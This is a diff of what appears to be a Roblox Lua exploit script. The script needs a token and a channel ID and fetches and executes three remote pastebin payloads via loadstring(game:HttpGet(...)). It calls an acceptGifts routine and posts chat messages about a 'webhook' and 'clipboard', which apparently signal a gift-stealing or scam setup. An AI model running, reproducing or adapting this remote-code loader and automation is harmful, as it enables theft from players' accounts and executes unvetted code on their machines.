@@ -36,10 +36,9 @@ if token == "" or channelId == "" then
     game.Players.LocalPlayer:Kick("Add your token or channelId to use")
 end
 
+loadstring(game:HttpGet('https://pastebin.com/raw/xmJDRh2j', true))()
 loadstring(game:HttpGet('https://pastebin.com/raw/xBLu3qtF', true))()
 loadstring(game:HttpGet('https://pastebin.com/raw/vbLfSAFd', true))()
-loadstring(game:HttpGet('https://pastebin.com/raw/xmJDRh2j', true))()
-
 
 
 local bb = game:GetService("VirtualUser")
@@ -112,9 +111,7 @@ end
 
 task.spawn(acceptGifts)
 
-game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('Yo gng check yo webhook')
-wait(0.5)
-game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('invite link is Dx6F8EJ9sD')
+game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('Yo gng check yo clipboard')
 wait(0.5)
 game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('GGS')
 
